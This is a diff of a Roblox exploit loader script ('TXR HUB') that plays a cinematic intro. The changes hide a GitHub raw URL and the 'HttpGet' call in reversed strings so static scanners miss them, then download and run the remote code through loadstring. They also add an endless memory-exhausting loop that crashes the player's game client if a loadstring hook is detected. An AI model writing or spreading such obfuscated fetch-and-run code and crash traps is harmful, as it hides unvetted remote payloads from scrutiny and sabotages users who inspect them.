@@ -1,5 +1,5 @@
 -- =========================================================
--- 👑 TXR HUB: 100% CLEAN VOID (ANTI-LUNR / ANTI-DUMP) 👑
+-- 👑 TXR HUB: 100% CLEAN VOID (ANTI-DUMP & CRASHER) 👑
 -- =========================================================
 
 local LOAD_DURATION = 5.0 -- 5-Second Runtime
@@ -10,24 +10,35 @@ local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 
--- 🛡️ GHOST-LINK ENCRYPTION (Bypasses Lunr, Pastefy & Static Scanners)
--- Yahan URL text format ya arrays me hai hi nahi. Tukdo ko ulta kiya gaya hai.
-local preloadedScript = nil
+-- 💥 ANTI-CRACK SYSTEM: Crashes the game if a Spy is detected
+local function ClientCrash()
+    while true do
+        pcall(function()
+            table.insert({}, string.rep("CRASH", 9999999))
+        end)
+    end
+end
+
+-- 🚀 Secure Execution Wrapper (Runs instantly after intro)
+local preloadedPayload = nil
 task.spawn(function()
-    local method = string.reverse("teGpttH") -- Hides HttpGet
-    local c1 = string.reverse("war//:sptth") -- Hides https://raw
-    local c2 = string.reverse("moc.tnetnocresubuhtig.") -- Hides .githubusercontent.com
-    local c3 = string.reverse("atleD/edoleley/") -- Hides /yelelode/Delta
-    local c4 = string.reverse("niam/sdaeh/sfer/") -- Hides /refs/heads/main
-    local c5 = string.reverse("aul.noisreV1eruceS/") -- Hides /Secure1Version.lua
-    
+    local exec = loadstring
+    local req = string.reverse("teGpttH")
+    local link = string.reverse("aul.noisreV1eruceS/niam/sdaeh/sfer/atleD/edoleley/moc.tnetnocresubuhtig.war//:sptth")
+
+    -- Check if Cracker is using a Loadstring Spy. If yes -> Instant Crash
+    if type(exec) == "function" and iscclosure and not iscclosure(exec) then
+        ClientCrash()
+    end
+
     local success, rawCode = pcall(function()
-        return game[method](game, c1 .. c2 .. c3 .. c4 .. c5)
+        return game[req](game, link)
     end)
+    
     if success and rawCode then
-        local runScript = loadstring(rawCode)
+        local runScript = exec(rawCode)
         if runScript then
-            preloadedScript = runScript
+            preloadedPayload = runScript
         end
     end
 end)
@@ -49,7 +60,7 @@ introGui.DisplayOrder = 9999999
 introGui.Parent = targetParent
 _G.TXR_MonogramIntro = introGui
 
--- 🌌 Cinematic Depth Blur Effect (Silky Quint)
+-- 🌌 Cinematic Depth Blur Effect 
 local blur = Instance.new("BlurEffect")
 blur.Name = "TXR_IntroBlur"
 blur.Size = 0
@@ -72,7 +83,7 @@ bgGrad.Color = ColorSequence.new({
 bgGrad.Rotation = 45
 TweenService:Create(bg, TweenInfo.new(1.0, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundTransparency = 0.04}):Play()
 
--- ✨ 2-Layer Ambient Starfield (Ultra-Smooth Math)
+-- ✨ 2-Layer Ambient Starfield
 local bgParticles = {}
 for i = 1, 36 do
     local p = Instance.new("Frame", bg)
@@ -96,7 +107,7 @@ mainCanvas.BackgroundTransparency = 1
 mainCanvas.GroupTransparency = 1
 mainCanvas.ZIndex = 10
 
--- 🌟 Flawless Hologram Entry (Graceful settle)
+-- 🌟 Flawless Hologram Entry
 local canvasScale = Instance.new("UIScale", mainCanvas)
 canvasScale.Scale = 0.8
 TweenService:Create(mainCanvas, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {GroupTransparency = 0}):Play()
@@ -607,23 +618,25 @@ task.spawn(function()
     end)
 
     -- =========================================================
-    -- 🚀 SECURE INSTANT EXECUTION
+    -- 🚀 SECURE INSTANT EXECUTION WITH ANTI-TAMPER
     -- =========================================================
-    if preloadedScript then
-        task.spawn(preloadedScript)
+    if preloadedPayload then
+        -- Check again right before execution if loadstring got hooked mid-way
+        if iscclosure and not iscclosure(loadstring) then ClientCrash() end
+        task.spawn(preloadedPayload)
     else
         task.spawn(function()
-            local method = string.reverse("teGpttH")
-            local c1 = string.reverse("war//:sptth")
-            local c2 = string.reverse("moc.tnetnocresubuhtig.")
-            local c3 = string.reverse("atleD/edoleley/")
-            local c4 = string.reverse("niam/sdaeh/sfer/")
-            local c5 = string.reverse("aul.noisreV1eruceS/")
+            local exec = loadstring
+            local req = string.reverse("teGpttH")
+            local link = string.reverse("aul.noisreV1eruceS/niam/sdaeh/sfer/atleD/edoleley/moc.tnetnocresubuhtig.war//:sptth")
+            
+            if iscclosure and not iscclosure(exec) then ClientCrash() end
+
             local success, rawCode = pcall(function()
-                return game[method](game, c1 .. c2 .. c3 .. c4 .. c5)
+                return game[req](game, link)
             end)
             if success and rawCode then
-                local runScript = loadstring(rawCode)
+                local runScript = exec(rawCode)
                 if runScript then runScript() end
             end
         end)
